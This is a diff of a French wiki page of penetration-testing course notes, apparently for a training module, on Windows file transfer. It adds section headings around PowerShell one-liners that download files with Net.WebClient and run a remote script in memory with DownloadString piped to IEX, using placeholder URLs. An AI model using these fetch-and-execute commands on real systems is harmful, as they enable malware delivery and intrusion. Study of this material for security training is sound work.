@@ -2,7 +2,7 @@
 title: File Transfers
 description: 
 published: true
-date: 2025-03-22T14:23:04.159Z
+date: 2025-03-22T14:24:27.512Z
 tags: notes, htb, module
 editor: markdown
 dateCreated: 2025-03-16T15:21:30.098Z
@@ -72,6 +72,8 @@ Cependant un webshell ou l'utilitaire de ligne de commande Windows (cmd.exe) ont
 
 Il est possible d'utiliser la classe PowerShell [system.net.webclient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient) pour télécharger des fichiers avec HTTP/S ou encore FTP.
 
+### File Download
+
 Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:
 ```
 (New-Object Net.WebClient).DownloadFile('<URL>','<fichier de sortie>')
@@ -79,6 +81,8 @@ Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:
 ```
 (New-Object Net.WebClient).DownloadFileAsync('<URL>','<fichier de sortie>')
 ```
+
+### PowerShell DownloadString - Fileless Method
 
 Au lieu de télécharger un script PowerShell sur le disque, on peut l'exécuter directement en mémoire en utilisant la commande Invoke-Expression.
 Éxécuter un fichier (mode fileless) avec [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) et la méthode DownloadString:
@@ -88,4 +92,7 @@ IEX (New-Object Net.WebClient).DownloadString('<URL>')
 ```
 (New-Object Net.WebClient).DownloadString('<URL>') | IEX
 ```
+
+### PowerShell Invoke-WebRequest
+
 
